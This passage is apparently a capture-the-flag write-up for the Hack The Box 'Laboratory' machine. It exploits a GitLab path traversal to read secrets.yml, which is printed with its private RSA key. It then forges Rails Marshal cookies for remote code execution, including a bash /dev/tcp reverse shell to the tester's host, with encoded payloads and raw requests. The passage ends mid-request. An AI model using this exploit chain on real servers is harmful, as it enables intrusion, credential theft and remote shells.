+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">request = ActionDispatch::Request.new(Rails.application.env_config)</span><br><span class="line">request.env[<span class="string">&quot;action_dispatch.cookies_serializer&quot;</span>] = :marshal</span><br><span class="line">cookies = request.cookie_jar</span><br><span class="line"></span><br><span class="line">erb = ERB.new(<span class="string">&quot;&lt;%= `echo lucifer11 was here &gt; /tmp/luci` %&gt;&quot;</span>)</span><br><span class="line">depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, <span class="string">&quot;@result&quot;</span>, ActiveSupport::Deprecation.new)</span><br><span class="line">cookies.signed[:cookie] = depr</span><br><span class="line">puts cookies[:cookie]</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>make a marshell payload that will make a file on the server &#x2F;tmp&#x2F;shell.sh with the content to my reverse shell</p>
+</li>
+<li><p>now url-encode the payload and set it in experimentation_subject_id</p>
+</li>
+<li><p>make another marshell payload that will execute the file</p>
+</li>
+</ul>
+<p>got a docker running gitlab, installed gitlab locally on local system and spawned the gitlab-rails console and type the following</p>
+<p>before put the content into gitlab-rails console,we had to read: &#x2F;opt&#x2F;gitlab&#x2F;embedded&#x2F;service&#x2F;gitlab-rails&#x2F;config&#x2F;secrets.yml,then replace the content in the gitlab docker container.</p>
+<p>read &#x2F;opt&#x2F;gitlab&#x2F;embedded&#x2F;service&#x2F;gitlab-rails&#x2F;config&#x2F;secrets.yml</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml)</span><br></pre></td></tr></table></figure>
+
+<p>and got the content:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># This file is managed by gitlab-ctl. Manual changes will be</span></span><br><span class="line"><span class="comment"># erased! To change the contents below, edit /etc/gitlab/gitlab.rb</span></span><br><span class="line"><span class="comment"># and run `sudo gitlab-ctl reconfigure`.</span></span><br><span class="line"></span><br><span class="line">---</span><br><span class="line">production:</span><br><span class="line">  db_key_base: 627773a77f567a5853a5c6652018f3f6e41d04aa53ed1e0df33c66b04ef0c38b88f402e0e73ba7676e93f1e54e425f74d59528fb35b170a1b9d5ce620bc11838</span><br><span class="line">  secret_key_base: 3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3</span><br><span class="line">  otp_key_base: db3432d6fa4c43e68bf7024f3c92fea4eeea1f6be1e6ebd6bb6e40e930f0933068810311dc9f0ec78196faa69e0aac01171d62f4e225d61e0b84263903fd06af</span><br><span class="line">  openid_connect_signing_key: |</span><br><span class="line">    -----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">    MIIJKQIBAAKCAgEA5LQnENotwu/SUAshZ9vacrnVeYXrYPJoxkaRc2Q3JpbRcZTu</span><br><span class="line">    YxMJm2+5ZDzaDu5T4xLbcM0BshgOM8N3gMcogz0KUmMD3OGLt90vNBq8Wo/9cSyV</span><br><span class="line">    RnBSnbCl0EzpFeeMBymR8aBm8sRpy7+n9VRawmjX9os25CmBBJB93NnZj8QFJxPt</span><br><span class="line">    u00f71w1pOL+CIEPAgSSZazwI5kfeU9wCvy0Q650ml6nC7lAbiinqQnocvCGbV0O</span><br><span class="line">    aDFmO98dwdJ3wnMTkPAwvJcESa7iRFMSuelgst4xt4a1js1esTvvVHO/fQfHdYo3</span><br><span class="line">    5Y8r9yYeCarBYkFiqPMec8lhrfmviwcTMyK/TBRAkj9wKKXZmm8xyNcEzP5psRAM</span><br><span class="line">    e4RO91xrgQx7ETcBuJm3xnfGxPWvqXjvbl72UNvU9ZXuw6zGaS7fxqf8Oi9u8R4r</span><br><span class="line">    T/5ABWZ1CSucfIySfJJzCK/pUJzRNnjsEgTc0HHmyn0wwSuDp3w8EjLJIl4vWg1Z</span><br><span class="line">    vSCEPzBJXnNqJvIGuWu3kHXONnTq/fHOjgs3cfo0i/eS/9PUMz4R3JO+kccIz4Zx</span><br><span class="line">    NFvKwlJZH/4ldRNyvI32yqhfMUUKVsNGm+7CnJNHm8wG3CMS5Z5+ajIksgEZBW8S</span><br><span class="line">    JosryuUVF3pShOIM+80p5JHdLhJOzsWMwap57AWyBia6erE40DS0e0BrpdsCAwEA</span><br><span class="line">    AQKCAgB5Cxg6BR9/Muq+zoVJsMS3P7/KZ6SiVOo7NpI43muKEvya/tYEvcix6bnX</span><br><span class="line">    YZWPnXfskMhvtTEWj0DFCMkw8Tdx7laOMDWVLBKEp54aF6Rk0hyzT4NaGoy/RQUd</span><br><span class="line">    b/dVTo2AJPJHTjvudSIBYliEsbavekoDBL9ylrzgK5FR2EMbogWQHy4Nmc4zIzyJ</span><br><span class="line">    HlKRMa09ximtgpA+ZwaPcAm+5uyJfcXdBgenXs7I/t9tyf6rBr4/F6dOYgbX3Uik</span><br><span class="line">    kr4rvjg218kTp2HvlY3P15/roac6Q/tQRQ3GnM9nQm9y5SgOBpX8kcDv0IzWa+gt</span><br><span class="line">    +aAMXsrW3IXbhlQafjH4hTAWOme/3gz87piKeSH61BVyW1sFUcuryKqoWPjjqhvA</span><br><span class="line">    hsNiM9AOXumQNNQvVVijJOQuftsSRCLkiik5rC3rv9XvhpJVQoi95ouoBU7aLfI8</span><br><span class="line">    MIkuT+VrXbE7YYEmIaCxoI4+oFx8TPbTTDfbwgW9uETse8S/lOnDwUvb+xenEOku</span><br><span class="line">    r68Bc5Sz21kVb9zGQVD4SrES1+UPCY0zxAwXRur6RfH6np/9gOj7ATUKpNk/583k</span><br><span class="line">    Mc3Gefh+wyhmalDDfaTVJ59A7uQFS8FYoXAmGy/jPY/uhGr8BinthxX6UcaWyydX</span><br><span class="line">    sg2l6K26XD6pAObLVYsXbQGpJa2gKtIhcbMaUHdi2xekLORygQKCAQEA+5XMR3nk</span><br><span class="line">    psDUlINOXRbd4nKCTMUeG00BPQJ80xfuQrAmdXgTnhfe0PlhCb88jt8ut+sx3N0a</span><br><span class="line">    0ZHaktzuYZcHeDiulqp4If3OD/JKIfOH88iGJFAnjYCbjqbRP5+StBybdB98pN3W</span><br><span class="line">    Lo4msLsyn2/kIZKCinSFAydcyIH7l+FmPA0dTocnX7nqQHJ3C9GvEaECZdjrc7KT</span><br><span class="line">    fbC7TSFwOQbKwwr0PFAbOBh83MId0O2DNu5mTHMeZdz2JXSELEcm1ywXRSrBA9+q</span><br><span class="line">    wjGP2QpuXxEUBWLbjsXeG5kesbYT0xcZ9RbZRLQOz/JixW6P4/lg8XD/SxVhH5T+</span><br><span class="line">    k9WFppd3NBWa4QKCAQEA6LeQWE+XXnbYUdwdveTG99LFOBvbUwEwa9jTjaiQrcYf</span><br><span class="line">    Uspt0zNCehcCFj5TTENZWi5HtT9j8QoxiwnNTcbfdQ2a2YEAW4G8jNA5yNWWIhzK</span><br><span class="line">    wkyOe22+Uctenc6yA9Z5+TlNJL9w4tIqzBqWvV00L+D1e6pUAYa7DGRE3x+WSIz1</span><br><span class="line">    UHoEjo6XeHr+s36936c947YWYyNH3o7NPPigTwIGNy3f8BoDltU8DH45jCHJVF57</span><br><span class="line">    /NKluuuU5ZJ3SinzQNpJfsZlh4nYEIV5ZMZOIReZbaq2GSGoVwEBxabR/KiqAwCX</span><br><span class="line">    wBZDWKw4dJR0nEeQb2qCxW30IiPnwVNiRcQZ2KN0OwKCAQAHBmnL3SV7WosVEo2P</span><br><span class="line">    n+HWPuhQiHiMvpu4PmeJ5XMrvYt1YEL7+SKppy0EfqiMPMMrM5AS4MGs9GusCitF</span><br><span class="line">    4le9DagiYOQ13sZwP42+YPR85C6KuQpBs0OkuhfBtQz9pobYuUBbwi4G4sVFzhRd</span><br><span class="line">    y1wNa+/lOde0/NZkauzBkvOt3Zfh53g7/g8Cea/FTreawGo2udXpRyVDLzorrzFZ</span><br><span class="line">    Bk2HILktLfd0m4pxB6KZgOhXElUc8WH56i+dYCGIsvvsqjiEH+t/1jEIdyXTI61t</span><br><span class="line">    TibG97m1xOSs1Ju8zp7DGDQLWfX7KyP2vofvh2TRMtd4JnWafSBXJ2vsaNvwiO41</span><br><span class="line">    MB1BAoIBAQCTMWfPM6heS3VPcZYuQcHHhjzP3G7A9YOW8zH76553C1VMnFUSvN1T</span><br><span class="line">    M7JSN2GgXwjpDVS1wz6HexcTBkQg6aT0+IH1CK8dMdX8isfBy7aGJQfqFVoZn7Q9</span><br><span class="line">    MBDMZ6wY2VOU2zV8BMp17NC9ACRP6d/UWMlsSrOPs5QjplgZeHUptl6DZGn1cSNF</span><br><span class="line">    RSZMieG20KVInidS1UHj9xbBddCPqIwd4po913ZltMGidUQY6lXZU1nA88t3iwJG</span><br><span class="line">    onlpI1eEsYzC7uHQ9NMAwCukHfnU3IRi5RMAmlVLkot4ZKd004mVFI7nJC28rFGZ</span><br><span class="line">    Cz0mi+1DS28jSQSdg3BWy1LhJcPjTp95AoIBAQDpGZ6iLm8lbAR+O8IB2om4CLnV</span><br><span class="line">    oBiqY1buWZl2H03dTgyyMAaePL8R0MHZ90GxWWu38aPvfVEk24OEPbLCE4DxlVUr</span><br><span class="line">    0VyaudN5R6gsRigArHb9iCpOjF3qPW7FaKSpevoCpRLVcAwh3EILOggdGenXTP1k</span><br><span class="line">    huZSO2K3uFescY74aMcP0qHlLn6sxVFKoNotuPvq5tIvIWlgpHJIysR9bMkOpbhx</span><br><span class="line">    UR3u0Ca0Ccm0n2AK+92GBF/4Z2rZ6MgedYsQrB6Vn8sdFDyWwMYjQ8dlrow/XO22</span><br><span class="line">    z/ulFMTrMITYU5lGDnJ/eyiySKslIiqgVEgQaFt9b0U3Nt0XZeCobSH1ltgN</span><br><span class="line">    -----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
+
+<p>then replace the content in local gitlab docker’s secrets.yml file,then lunch gitlab-rails console:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/hackthebox/machine/laboratory<span class="comment"># docker run --rm -d -p 4443:443 -p 8090:80 -p 2222:22 --name gitlab gitlab/gitlab-ce:12.8.1-ce.0</span></span><br><span class="line">Unable to find image <span class="string">&#x27;gitlab/gitlab-ce:12.8.1-ce.0&#x27;</span> locally</span><br><span class="line">12.8.1-ce.0: Pulling from gitlab/gitlab-ce</span><br><span class="line">fe703b657a32: Pull complete </span><br><span class="line">f9df1fafd224: Pull complete </span><br><span class="line">a645a4b887f9: Pull complete </span><br><span class="line">57db7fe0b522: Pull complete </span><br><span class="line">7c1fdc95f4c9: Pull complete </span><br><span class="line">efff5e3fbef4: Pull complete </span><br><span class="line">cd352b2b7d4b: Pull complete </span><br><span class="line">9cfdfa991813: Pull complete </span><br><span class="line">27f887c2ede5: Pull complete </span><br><span class="line">68b87e2fd6a0: Pull complete </span><br><span class="line">Digest: sha256:01325161649a28155d8857e4f47462d2bf9406d612c11b8929d2482bfba3ad32</span><br><span class="line">Status: Downloaded newer image <span class="keyword">for</span> gitlab/gitlab-ce:12.8.1-ce.0</span><br><span class="line">1df67bb56116b7530b7ada370ecfab40312aee8d3d67bff53852ffd0cb6e2815</span><br><span class="line">root@kali:~<span class="comment"># docker exec -ti gitlab bash</span></span><br><span class="line">root@1df67bb56116:/<span class="comment"># gitlab-rails console</span></span><br><span class="line">(put the following content of what we got)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>content:</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">request = ActionDispatch::Request.new(Rails.application.env_config)</span><br><span class="line">request.env[<span class="string">&quot;action_dispatch.cookies_serializer&quot;</span>] = :marshal</span><br><span class="line">cookies = request.cookie_jar</span><br><span class="line"></span><br><span class="line">erb = ERB.new(<span class="string">&quot;&lt;%= `echo &#x27;bash -i &gt;&amp; /dev/tcp/10.10.14.3/1234 0&gt;&amp;1&#x27; &gt; /tmp/shell.sh` %&gt;&quot;</span>)</span><br><span class="line">depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, <span class="string">&quot;@result&quot;</span>, ActiveSupport::Deprecation.new)</span><br><span class="line">cookies.signed[:cookie] = depr</span><br><span class="line">puts cookies[:cookie]</span><br></pre></td></tr></table></figure>
+
+<p>now the output marshell-payload was</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kiAXwjY29kaW5nOlVURi04Cl9lcmJvdXQgPSArJyc7IF9lcmJvdXQuPDwoKCBgZWNobyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zLzEyMzQgMD4mMScgPiAvdG1wL3NoZWxsLnNoYCApLnRvX3MpOyBfZXJib3V0BjoGRUY6DkBlbmNvZGluZ0l1Og1FbmNvZGluZwpVVEYtOAY7CkY6E0Bmcm96ZW5fc3RyaW5nMDoOQGZpbGVuYW1lMDoMQGxpbmVub2kAOgxAbWV0aG9kOgtyZXN1bHQ6CUB2YXJJIgxAcmVzdWx0BjsKVDoQQGRlcHJlY2F0b3JJdTofQWN0aXZlU3VwcG9ydDo6RGVwcmVjYXRpb24ABjsKVA==--45d9d01f0bcc1f1b323513b0b12d81e2577dcf50</span><br></pre></td></tr></table></figure>
+
+<p>url-encode with burp</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%42%41%68%76%4f%6b%42%42%59%33%52%70%64%6d%56%54%64%58%42%77%62%33%4a%30%4f%6a%70%45%5a%58%42%79%5a%57%4e%68%64%47%6c%76%62%6a%6f%36%52%47%56%77%63%6d%56%6a%59%58%52%6c%5a%45%6c%75%63%33%52%68%62%6d%4e%6c%56%6d%46%79%61%57%46%69%62%47%56%51%63%6d%39%34%65%51%6b%36%44%6b%42%70%62%6e%4e%30%59%57%35%6a%5a%57%38%36%43%45%56%53%51%67%73%36%45%45%42%7a%59%57%5a%6c%58%32%78%6c%64%6d%56%73%4d%44%6f%4a%51%48%4e%79%59%30%6b%69%41%58%77%6a%59%32%39%6b%61%57%35%6e%4f%6c%56%55%52%69%30%34%43%6c%39%6c%63%6d%4a%76%64%58%51%67%50%53%41%72%4a%79%63%37%49%46%39%6c%63%6d%4a%76%64%58%51%75%50%44%77%6f%4b%43%42%67%5a%57%4e%6f%62%79%41%6e%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%78%4d%43%34%78%4d%43%34%78%4e%43%34%7a%4c%7a%45%79%4d%7a%51%67%4d%44%34%6d%4d%53%63%67%50%69%41%76%64%47%31%77%4c%33%4e%6f%5a%57%78%73%4c%6e%4e%6f%59%43%41%70%4c%6e%52%76%58%33%4d%70%4f%79%42%66%5a%58%4a%69%62%33%56%30%42%6a%6f%47%52%55%59%36%44%6b%42%6c%62%6d%4e%76%5a%47%6c%75%5a%30%6c%31%4f%67%31%46%62%6d%4e%76%5a%47%6c%75%5a%77%70%56%56%45%59%74%4f%41%59%37%43%6b%59%36%45%30%42%6d%63%6d%39%36%5a%57%35%66%63%33%52%79%61%57%35%6e%4d%44%6f%4f%51%47%5a%70%62%47%56%75%59%57%31%6c%4d%44%6f%4d%51%47%78%70%62%6d%56%75%62%32%6b%41%4f%67%78%41%62%57%56%30%61%47%39%6b%4f%67%74%79%5a%58%4e%31%62%48%51%36%43%55%42%32%59%58%4a%4a%49%67%78%41%63%6d%56%7a%64%57%78%30%42%6a%73%4b%56%44%6f%51%51%47%52%6c%63%48%4a%6c%59%32%46%30%62%33%4a%4a%64%54%6f%66%51%57%4e%30%61%58%5a%6c%55%33%56%77%63%47%39%79%64%44%6f%36%52%47%56%77%63%6d%56%6a%59%58%52%70%62%32%34%41%42%6a%73%4b%56%41%3d%3d%2d%2d%34%35%64%39%64%30%31%66%30%62%63%63%31%66%31%62%33%32%33%35%31%33%62%30%62%31%32%64%38%31%65%32%35%37%37%64%63%66%35%30</span><br></pre></td></tr></table></figure>
+
+<p>and replace the text in the experimentation_subject_id cookie with above url-encode</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: git.laboratory.htb</span><br><span class="line"></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line"></span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36</span><br><span class="line"></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"></span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line"></span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line"></span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line"></span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line"></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line"></span><br><span class="line">Accept-Language: en-US,en;q=0.9,hi;q=0.8</span><br><span class="line"></span><br><span class="line">Cookie: experimentation_subject_id=%42%41%68%76%4f%6b%42%42%59%33%52%70%64%6d%56%54%64%58%42%77%62%33%4a%30%4f%6a%70%45%5a%58%42%79%5a%57%4e%68%64%47%6c%76%62%6a%6f%36%52%47%56%77%63%6d%56%6a%59%58%52%6c%5a%45%6c%75%63%33%52%68%62%6d%4e%6c%56%6d%46%79%61%57%46%69%62%47%56%51%63%6d%39%34%65%51%6b%36%44%6b%42%70%62%6e%4e%30%59%57%35%6a%5a%57%38%36%43%45%56%53%51%67%73%36%45%45%42%7a%59%57%5a%6c%58%32%78%6c%64%6d%56%73%4d%44%6f%4a%51%48%4e%79%59%30%6b%69%41%58%77%6a%59%32%39%6b%61%57%35%6e%4f%6c%56%55%52%69%30%34%43%6c%39%6c%63%6d%4a%76%64%58%51%67%50%53%41%72%4a%79%63%37%49%46%39%6c%63%6d%4a%76%64%58%51%75%50%44%77%6f%4b%43%42%67%5a%57%4e%6f%62%79%41%6e%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%78%4d%43%34%78%4d%43%34%78%4e%43%34%7a%4c%7a%45%79%4d%7a%51%67%4d%44%34%6d%4d%53%63%67%50%69%41%76%64%47%31%77%4c%33%4e%6f%5a%57%78%73%4c%6e%4e%6f%59%43%41%70%4c%6e%52%76%58%33%4d%70%4f%79%42%66%5a%58%4a%69%62%33%56%30%42%6a%6f%47%52%55%59%36%44%6b%42%6c%62%6d%4e%76%5a%47%6c%75%5a%30%6c%31%4f%67%31%46%62%6d%4e%76%5a%47%6c%75%5a%77%70%56%56%45%59%74%4f%41%59%37%43%6b%59%36%45%30%42%6d%63%6d%39%36%5a%57%35%66%63%33%52%79%61%57%35%6e%4d%44%6f%4f%51%47%5a%70%62%47%56%75%59%57%31%6c%4d%44%6f%4d%51%47%78%70%62%6d%56%75%62%32%6b%41%4f%67%78%41%62%57%56%30%61%47%39%6b%4f%67%74%79%5a%58%4e%31%62%48%51%36%43%55%42%32%59%58%4a%4a%49%67%78%41%63%6d%56%7a%64%57%78%30%42%6a%73%4b%56%44%6f%51%51%47%52%6c%63%48%4a%6c%59%32%46%30%62%33%4a%4a%64%54%6f%66%51%57%4e%30%61%58%5a%6c%55%33%56%77%63%47%39%79%64%44%6f%36%52%47%56%77%63%6d%56%6a%59%58%52%70%62%32%34%41%42%6a%73%4b%56%41%3d%3d%2d%2d%34%35%64%39%64%30%31%66%30%62%63%63%31%66%31%62%33%32%33%35%31%33%62%30%62%31%32%64%38%31%65%32%35%37%37%64%63%66%35%30; _gitlab_session=64a14454670dfee5793be2a3a7655626; event_filter=all; sidebar_collapsed=<span class="literal">false</span></span><br><span class="line"></span><br><span class="line">Content-Length: 2</span><br></pre></td></tr></table></figure>
+
+<p>Now the shell would be written in: &#x2F;tmp&#x2F;shell.sh</p>
+<ul>
+<li>calling the shell</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">request = ActionDispatch::Request.new(Rails.application.env_config)</span><br><span class="line">request.env[<span class="string">&quot;action_dispatch.cookies_serializer&quot;</span>] = :marshal</span><br><span class="line">cookies = request.cookie_jar</span><br><span class="line"></span><br><span class="line">erb = ERB.new(<span class="string">&quot;&lt;%= `bash /tmp/shell.sh` %&gt;&quot;</span>)</span><br><span class="line">depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, <span class="string">&quot;@result&quot;</span>, ActiveSupport::Deprecation.new)</span><br><span class="line">cookies.signed[:cookie] = depr</span><br><span class="line">puts cookies[:cookie]</span><br></pre></td></tr></table></figure>
+
+<p>marshell-payload</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kiVCNjb2Rpbmc6VVRGLTgKX2VyYm91dCA9ICsnJzsgX2VyYm91dC48PCgoIGBiYXNoIC90bXAvc2hlbGwuc2hgICkudG9fcyk7IF9lcmJvdXQGOgZFRjoOQGVuY29kaW5nSXU6DUVuY29kaW5nClVURi04BjsKRjoTQGZyb3plbl9zdHJpbmcwOg5AZmlsZW5hbWUwOgxAbGluZW5vaQA6DEBtZXRob2Q6C3Jlc3VsdDoJQHZhckkiDEByZXN1bHQGOwpUOhBAZGVwcmVjYXRvckl1Oh9BY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbgAGOwpU--884348f2b9b207a302df24d298a43c040a8d1021</span><br></pre></td></tr></table></figure>
+
+<p>url-encode with burp</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%42%41%68%76%4f%6b%42%42%59%33%52%70%64%6d%56%54%64%58%42%77%62%33%4a%30%4f%6a%70%45%5a%58%42%79%5a%57%4e%68%64%47%6c%76%62%6a%6f%36%52%47%56%77%63%6d%56%6a%59%58%52%6c%5a%45%6c%75%63%33%52%68%62%6d%4e%6c%56%6d%46%79%61%57%46%69%62%47%56%51%63%6d%39%34%65%51%6b%36%44%6b%42%70%62%6e%4e%30%59%57%35%6a%5a%57%38%36%43%45%56%53%51%67%73%36%45%45%42%7a%59%57%5a%6c%58%32%78%6c%64%6d%56%73%4d%44%6f%4a%51%48%4e%79%59%30%6b%69%56%43%4e%6a%62%32%52%70%62%6d%63%36%56%56%52%47%4c%54%67%4b%58%32%56%79%59%6d%39%31%64%43%41%39%49%43%73%6e%4a%7a%73%67%58%32%56%79%59%6d%39%31%64%43%34%38%50%43%67%6f%49%47%42%69%59%58%4e%6f%49%43%39%30%62%58%41%76%63%32%68%6c%62%47%77%75%63%32%68%67%49%43%6b%75%64%47%39%66%63%79%6b%37%49%46%39%6c%63%6d%4a%76%64%58%51%47%4f%67%5a%46%52%6a%6f%4f%51%47%56%75%59%32%39%6b%61%57%35%6e%53%58%55%36%44%55%56%75%59%32%39%6b%61%57%35%6e%43%6c%56%55%52%69%30%34%42%6a%73%4b%52%6a%6f%54%51%47%5a%79%62%33%70%6c%62%6c%39%7a%64%48%4a%70%62%6d%63%77%4f%67%35%41%5a%6d%6c%73%5a%57%35%68%62%57%55%77%4f%67%78%41%62%47%6c%75%5a%57%35%76%61%51%41%36%44%45%42%74%5a%58%52%6f%62%32%51%36%43%33%4a%6c%63%33%56%73%64%44%6f%4a%51%48%5a%68%63%6b%6b%69%44%45%42%79%5a%58%4e%31%62%48%51%47%4f%77%70%55%4f%68%42%41%5a%47%56%77%63%6d%56%6a%59%58%52%76%63%6b%6c%31%4f%68%39%42%59%33%52%70%64%6d%56%54%64%58%42%77%62%33%4a%30%4f%6a%70%45%5a%58%42%79%5a%57%4e%68%64%47%6c%76%62%67%41%47%4f%77%70%55%2d%2d%38%38%34%33%34%38%66%32%62%39%62%32%30%37%61%33%30%32%64%66%32%34%64%32%39%38%61%34%33%63%30%34%30%61%38%64%31%30%32%31</span><br></pre></td></tr></table></figure>
+
+<p>and replace the text in the experimentation_subject_id cookie with above url-encode</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: git.laboratory.htb</span><br><span class="line"></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line"></span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36</span><br><span class="line"></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"></span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line"></span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line"></span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line"></span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line"></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line"></span><br><span class="line">Accept-Language: en-US,en;q=0.9,hi;q=0.8</span><br><span 